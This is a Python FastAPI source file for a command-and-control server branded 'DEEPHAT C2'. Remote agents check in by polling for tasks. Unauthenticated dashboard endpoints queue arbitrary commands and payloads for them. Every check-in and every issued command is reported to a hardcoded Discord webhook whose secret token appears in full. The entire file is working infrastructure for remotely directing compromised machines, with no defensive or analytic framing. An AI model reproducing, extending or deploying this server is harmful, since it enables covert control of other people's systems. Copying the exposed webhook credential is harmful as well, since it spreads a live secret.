import os
import time
import uuid
import datetime
import requests
import threading
from typing import Optional

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn

app = FastAPI()

# --- 1. CONFIGURATION ---
# Update this to your Discord Webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1550899791062376488/1-GKmou21K3q1Om5xs3600j6asR8DOIcQ74KhUoeMg4drOEQ5MusQJympoT7TmhSUVJ8"

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- 2. DATA STORAGE ---
agents = {} 
tasks = {}  
AGENT_TIMEOUT_SECONDS = 60 

# --- 3. MODELS ---
class CommandRequest(BaseModel):
    agent_id: str
    command: str
    payload: Optional[str] = None

# --- 4. DISCORD LOGGING UTILITY ---

def discord_log(message: str, level: str = "INFO"):
    """Sends administrative logs to Discord in a non-blocking way."""
    def _send():
        emoji = "🔵"
        if level == "ERROR": emoji = "🔴"
        elif level == "SUCCESS": emoji = "✅"
        elif level == "WARN": emoji = "🟡"
        elif level == "CRITICAL": emoji = "💀"
        
        payload = {
            "embeds": [{
                "title": f"{emoji} C2 Admin Log",
                "description": message,
                "color": 0xff0000 if level != "INFO" else 0x00d4ff,
                "timestamp": datetime.datetime.utcnow().isoformat()
            }]
        }
        try:
            requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
        except Exception as e:
            print(f"[!] Discord Log Error: {e}")

    threading.Thread(target=_send, daemon=True).start()

# --- 5. UTILITY: CLEANUP ---

def cleanup_dead_agents():
    global agents, tasks
    current_time = time.time()
    dead_agents = []

    for agent_id, data in agents.items():
        if current_time - data['last_seen'] > AGENT_TIMEOUT_SECONDS:
            dead_agents.append(agent_id)

    for agent_id in dead_agents:
        del agents[agent_id]
        if agent_id in tasks:
            del tasks[agent_id]
        discord_log(f"Agent {agent_id} timed out and was removed.", "WARN")
    
    return len(dead_agents)

# --- 6. AGENT ENDPOINTS (Heartbeat & Tasking) ---

@app.get("/agent/{agent_id}/poll")
async def poll_task(agent_id: str):
    # Register or update heartbeat
    if agent_id not in agents:
        agents[agent_id] = {"status": "online"}
        discord_log(f"New Agent Connection: {agent_id}", "SUCCESS")
    
    agents[agent_id]["last_seen"] = time.time()
    agents[agent_id]["status"] = "online"
    
    if agent_id in tasks and len(tasks[agent_id]) > 0:
        task = tasks[agent_id].pop(0)
        return task
    
    return {"task": "IDLE", "task_id": None, "payload": None}

# --- 7. DASHBOARD ENDPOINTS (Admin Panel) ---

@app.get("/dashboard/agents")
async def list_agents():
    removed_count = cleanup_dead_agents()
    return agents

@app.post("/dashboard/command")
async def add_command(req: CommandRequest):
    # Check if agent exists
    if req.agent_id not in agents:
        agents[req.agent_id] = {"last_seen": time.time(), "status": "online"}
        discord_log(f"Command sent to new/unknown agent: {req.agent_id}", "WARN")

    new_task_id = str(uuid.uuid4())[:8] 
    new_task = {
        "task": req.command,
        "task_id": new_task_id,
        "payload": req.payload,
        "timestamp": datetime.datetime.now().strftime("%H:%M:%S")
    }

    if req.agent_id not in tasks:
        tasks[req.agent_id] = []
    
    tasks[req.agent_id].append(new_task)
    
    # Log the command issued via Dashboard
    discord_log(f"Command Issued: **{req.command}** to **{req.agent_id}**\nPayload: {req.payload or 'None'}", "INFO")
    
    return {"status": "success", "task_id": new_task_id}

@app.delete("/dashboard/agent/{agent_id}")
async def remove_agent(agent_id: str):
    if agent_id in agents:
        del agents[agent_id]
        if agent_id in tasks: 
            del tasks[agent_id]
        discord_log(f"Agent {agent_id} manually removed by admin.", "CRITICAL")
        return {"status": "removed"}
    raise HTTPException(status_code=404, detail="Agent not found")

@app.delete("/dashboard/clear_all")
async def clear_all_agents():
    global agents, tasks
    agents.clear()
    tasks.clear()
    discord_log("ALL agents cleared from system.", "CRITICAL")
    return {"status": "success", "message": "All agents cleared."}

# --- 8. MAIN ---

if __name__ == "__main__":
    print("--- DEEPHAT C2 BACKEND [DISCORD LOGGING ENABLED] ---")
    uvicorn.run(app, host="0.0.0.0", port=8000)